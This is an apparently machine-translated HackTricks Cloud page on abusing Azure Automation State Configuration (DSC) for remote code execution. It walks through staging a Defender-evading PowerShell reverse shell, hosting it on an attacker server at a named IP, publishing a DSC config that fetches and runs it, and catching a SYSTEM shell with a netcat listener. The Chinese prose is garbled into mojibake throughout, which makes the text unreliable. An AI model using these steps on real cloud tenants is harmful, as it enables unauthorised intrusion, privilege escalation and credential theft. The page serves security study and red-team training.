# Az - State Configuration RCE

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

**æŸ¥çœ‹å®Œæ•´æ–‡ç« ï¼š[https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### è¿œç¨‹æœåŠ¡å™¨ï¼ˆC2ï¼‰åŸºç¡€è®¾æ–½å‡†å¤‡å’Œæ­¥éª¤æ‘˜è¦

#### æ¦‚è¿°
è¯¥è¿‡ç¨‹æ¶‰åŠè®¾ç½®è¿œç¨‹æœåŠ¡å™¨åŸºç¡€è®¾æ–½ï¼Œç”¨äºæ‰˜ç®¡ä¸€ä¸ªä¿®æ”¹è¿‡çš„Nishang `Invoke-PowerShellTcp.ps1`æœ‰æ•ˆè½½è·ï¼Œå‘½åä¸º`RevPS.ps1`ï¼Œæ—¨åœ¨ç»•è¿‡Windows Defenderã€‚æœ‰æ•ˆè½½è·ä»IPä¸º`40.84.7.74`çš„Kali Linuxæœºå™¨ä¸Šçš„ç®€å•Python HTTPæœåŠ¡å™¨æä¾›ã€‚æ“ä½œé€šè¿‡ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤æ‰§è¡Œï¼š

#### æ­¥éª¤1 â€” åˆ›å»ºæ–‡ä»¶
- **æ‰€éœ€æ–‡ä»¶ï¼š** éœ€è¦ä¸¤ä¸ªPowerShellè„šæœ¬ï¼š
1. `reverse_shell_config.ps1`ï¼šä¸€ä¸ªæœŸæœ›çŠ¶æ€é…ç½®ï¼ˆDSCï¼‰æ–‡ä»¶ï¼Œç”¨äºè·å–å’Œæ‰§è¡Œæœ‰æ•ˆè½½è·ã€‚å¯ä»[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1)è·å–ã€‚
2. `push_reverse_shell_config.ps1`ï¼šä¸€ä¸ªç”¨äºå°†é…ç½®å‘å¸ƒåˆ°è™šæ‹Ÿæœºçš„è„šæœ¬ï¼Œå¯åœ¨[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1)è·å–ã€‚
- **å®šåˆ¶ï¼š** è¿™äº›æ–‡ä»¶ä¸­çš„å˜é‡å’Œå‚æ•°å¿…é¡»æ ¹æ®ç”¨æˆ·ç‰¹å®šçš„ç¯å¢ƒè¿›è¡Œå®šåˆ¶ï¼ŒåŒ…æ‹¬èµ„æºåç§°ã€æ–‡ä»¶è·¯å¾„å’ŒæœåŠ¡å™¨/æœ‰æ•ˆè½½è·æ ‡è¯†ç¬¦ã€‚

#### æ­¥éª¤2 â€” å‹ç¼©é…ç½®æ–‡ä»¶
- å°†`reverse_shell_config.ps1`å‹ç¼©æˆ`.zip`æ–‡ä»¶ï¼Œä½¿å…¶å‡†å¤‡å¥½ä¼ è¾“åˆ°Azureå­˜å‚¨è´¦æˆ·ã€‚
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### æ­¥éª¤ 3 â€” è®¾ç½®å­˜å‚¨ä¸Šä¸‹æ–‡ & ä¸Šä¼ 
- ä½¿ç”¨ Azure çš„ Set-AzStorageBlobContent å‘½ä»¤ï¼Œå°†å‹ç¼©çš„é…ç½®æ–‡ä»¶ä¸Šä¼ åˆ°é¢„å®šä¹‰çš„ Azure å­˜å‚¨å®¹å™¨ azure-pentestã€‚
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### æ­¥éª¤ 4 â€” å‡†å¤‡ Kali Box
- Kali æœåŠ¡å™¨ä» GitHub ä»“åº“ä¸‹è½½ RevPS.ps1 è´Ÿè½½ã€‚
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- è„šæœ¬å·²ç¼–è¾‘ä»¥æŒ‡å®šç›®æ ‡ Windows VM å’Œåå‘ shell çš„ç«¯å£ã€‚

#### æ­¥éª¤ 5 â€” å‘å¸ƒé…ç½®æ–‡ä»¶
- æ‰§è¡Œé…ç½®æ–‡ä»¶ï¼Œå¯¼è‡´åå‘ shell è„šæœ¬éƒ¨ç½²åˆ° Windows VM ä¸ŠæŒ‡å®šçš„ä½ç½®ã€‚

#### æ­¥éª¤ 6 â€” æ‰˜ç®¡ Payload å’Œè®¾ç½®ç›‘å¬å™¨
- å¯åŠ¨ Python SimpleHTTPServer æ¥æ‰˜ç®¡ Payloadï¼Œå¹¶å¯åŠ¨ Netcat ç›‘å¬å™¨ä»¥æ•è·ä¼ å…¥è¿æ¥ã€‚
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- è®¡åˆ’ä»»åŠ¡æ‰§è¡Œæœ‰æ•ˆè½½è·ï¼Œå®ç°äº†SYSTEMçº§åˆ«çš„ç‰¹æƒã€‚

#### ç»“è®º

è¿™ä¸ªè¿‡ç¨‹çš„æˆåŠŸæ‰§è¡Œä¸ºè¿›ä¸€æ­¥è¡ŒåŠ¨æ‰“å¼€äº†è®¸å¤šå¯èƒ½æ€§ï¼Œæ¯”å¦‚å‡­æ®è½¬å‚¨æˆ–å°†æ”»å‡»æ‰©å±•åˆ°å¤šä¸ªè™šæ‹Ÿæœºã€‚è¯¥æŒ‡å—é¼“åŠ±åœ¨Azure Automation DSCé¢†åŸŸç»§ç»­å­¦ä¹ å’Œåˆ›é€ ã€‚

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
